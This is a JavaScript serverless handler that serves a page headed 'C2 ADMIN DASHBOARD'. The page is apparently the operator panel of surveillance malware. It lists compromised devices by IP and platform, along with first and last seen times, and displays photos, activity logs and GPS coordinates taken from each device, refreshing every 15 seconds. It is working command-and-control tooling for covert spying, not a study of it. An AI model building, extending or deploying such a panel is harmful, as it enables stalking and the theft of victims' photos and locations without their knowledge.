module.exports = (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:30px}
        h1{color:#f7971e;margin-bottom:20px}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
        .card{background:#1a1a2e;border-radius:16px;padding:18px;border:1px solid #2a2a44}
        .card h3{color:#88ccff;margin-bottom:8px}
        .card .info{font-size:13px;color:#aab;line-height:1.7}
        .card .info .label{color:#4a6a7a}
        .card .photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:8px;margin-top:8px}
        .card .photo-grid img{width:100%;height:80px;object-fit:cover;border-radius:8px;border:1px solid #2a2a44;cursor:pointer}
        .card .photo-grid img:hover{transform:scale(1.05)}
        .btn{background:#f7971e;border:none;padding:6px 16px;border-radius:30px;color:#0a0a12;font-weight:600;cursor:pointer;margin-top:8px}
        .btn:hover{transform:scale(1.02)}
        .log-area{background:#0b0b14;border-radius:12px;padding:10px;max-height:120px;overflow-y:auto;font-family:'Courier New',monospace;font-size:11px;line-height:1.6;border:1px solid #1a1a2a;margin-top:8px}
        .log-entry{border-bottom:1px solid #0f0f1a;padding:2px 0}
        .log-entry .time{color:#4a6a7a;margin-right:8px}
        .log-entry .lvl-info{color:#88ccff}
        .log-entry .lvl-warn{color:#ffaa44}
        .log-entry .lvl-error{color:#ff5e5e}
        .log-entry .lvl-success{color:#6fcf97}
        .refresh-btn{background:#2a2a44;border:none;padding:10px 24px;border-radius:60px;color:#e0e0e0;font-weight:600;cursor:pointer;margin-bottom:20px}
        .refresh-btn:hover{background:#3a3a5a}
        .stat-bar{display:flex;gap:30px;flex-wrap:wrap;background:#1a1a2e;padding:14px 24px;border-radius:60px;margin-bottom:24px;border:1px solid #2a2a44}
        .stat-bar .stat .num{color:#f7971e;font-weight:700;font-size:20px}
    </style>
</head>
<body>
    <h1>☠️ C2 ADMIN DASHBOARD</h1>
    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px;">
        <button class="refresh-btn" onclick="loadDevices()">🔄 Refresh</button>
        <span style="color:#4a6a7a;align-self:center;font-size:13px;">Auto-refreshes every 15s</span>
    </div>
    <div class="stat-bar" id="statBar">
        <div class="stat">📱 Devices: <span class="num" id="statDevices">0</span></div>
        <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
        <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
        <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
    </div>
    <div id="devices" class="grid">Loading devices...</div>

    <script>
        async function fetchJSON(url) {
            try {
                const resp = await fetch(url);
                if (!resp.ok) return null;
                return await resp.json();
            } catch { return null; }
        }

        async function loadDevices() {
            const devices = await fetchJSON('/api/devices');
            const container = document.getElementById('devices');
            if (!devices || !Array.isArray(devices)) {
                container.innerHTML = '<div style="color:#ff5e5e;">⚠️ Failed to load devices. Make sure your Supabase is configured.</div>';
                return;
            }

            let totalPhotos = 0;
            let totalLogs = 0;
            let totalLocations = 0;

            container.innerHTML = '';
            for (const d of devices) {
                // Fetch photos, logs, locations for this device
                const [photos, logs, locations] = await Promise.all([
                    fetchJSON('/api/photos?deviceId=' + encodeURIComponent(d.id)),
                    fetchJSON('/api/logs?deviceId=' + encodeURIComponent(d.id)),
                    fetchJSON('/api/locations?deviceId=' + encodeURIComponent(d.id))
                ]);

                const photoCount = photos ? photos.length : 0;
                const logCount = logs ? logs.length : 0;
                const locCount = locations ? locations.length : 0;
                totalPhotos += photoCount;
                totalLogs += logCount;
                totalLocations += locCount;

                let photoHtml = '<div class="photo-grid">';
                if (photoCount === 0) {
                    photoHtml += '<div style="color:#4a6a7a;font-size:11px;">No photos</div>';
                } else {
                    const displayPhotos = photos.slice(0, 6);
                    displayPhotos.forEach(p => {
                        const imgUrl = p.publicUrl || (p.storage_path ? '/api/photo-file/' + p.storage_path : '');
                        if (imgUrl) {
                            photoHtml += `<img src="${imgUrl}" alt="photo" onclick="window.open('${imgUrl}')" />`;
                        }
                    });
                    if (photoCount > 6) {
                        photoHtml += `<div style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+${photoCount - 6} more</div>`;
                    }
                }
                photoHtml += '</div>';

                let logHtml = '<div class="log-area">';
                if (logCount === 0) {
                    logHtml += '<div style="color:#4a6a7a;">No logs</div>';
                } else {
                    logs.slice(0, 8).forEach(l => {
                        logHtml += `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level || 'info'}">${l.message}</span></div>`;
                    });
                }
                logHtml += '</div>';

                const lastLoc = locations && locations.length > 0 ? locations[0] : null;

                const card = document.createElement('div');
                card.className = 'card';
                card.innerHTML = `
                    <h3>${d.ip || 'Unknown IP'}</h3>
                    <div class="info">
                        <div><span class="label">Device:</span> ${d.platform || 'Unknown'}</div>
                        <div><span class="label">Screen:</span> ${d.screen || 'Unknown'}</div>
                        <div><span class="label">First seen:</span> ${new Date(d.first_seen).toLocaleString()}</div>
                        <div><span class="label">Last seen:</span> ${new Date(d.last_seen).toLocaleString()}</div>
                        ${lastLoc ? `<div><span class="label">📍 Latest:</span> ${lastLoc.lat}, ${lastLoc.lon}</div>` : ''}
                        <div><span class="label">📸 Photos:</span> ${photoCount} &nbsp;|&nbsp; <span class="label">📋 Logs:</span> ${logCount}</div>
                    </div>
                    ${photoHtml}
                    ${logHtml}
                    <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
                        <button class="btn" onclick="window.open('/api/photos?deviceId='+encodeURIComponent('${d.id}'))">📸 Photos</button>
                        <button class="btn" onclick="window.open('/api/logs?deviceId='+encodeURIComponent('${d.id}'))">📋 Logs</button>
                        <button class="btn" onclick="window.open('/api/locations?deviceId='+encodeURIComponent('${d.id}'))">📍 Locations</button>
                    </div>
                `;
                container.appendChild(card);
            }

            document.getElementById('statDevices').textContent = devices.length;
            document.getElementById('statPhotos').textContent = totalPhotos;
            document.getElementById('statLogs').textContent = totalLogs;
            document.getElementById('statLocations').textContent = totalLocations;
        }

        loadDevices();
        setInterval(loadDevices, 15000);
    </script>
</body>
</html>
    `);
};
